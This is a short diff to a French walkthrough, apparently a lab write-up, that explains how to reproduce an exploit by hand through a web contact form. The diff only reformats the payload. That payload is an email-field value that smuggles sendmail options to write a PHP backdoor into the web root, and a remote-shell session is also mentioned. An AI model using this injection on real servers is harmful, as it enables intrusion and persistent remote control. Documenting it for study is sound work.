@@ -43,7 +43,7 @@ RemoteShell> exit
 [+] Sortie
 ```
 En fait, ce script utilise implicitement le formulaire, et donc pour reproduire la meme chose manuellement avec le formulaire on remplissant les champs de formulaire par les données suivant:
-avec Your Email : "vulnerables\" -OQueueDirectory=/tmp -X/www/backdoor.php server" @test.com
+avec Your Email : ```"vulnerables\" -OQueueDirectory=/tmp -X/www/backdoor.php server" @test.com```
 
 ![](manuelle1.png)
 
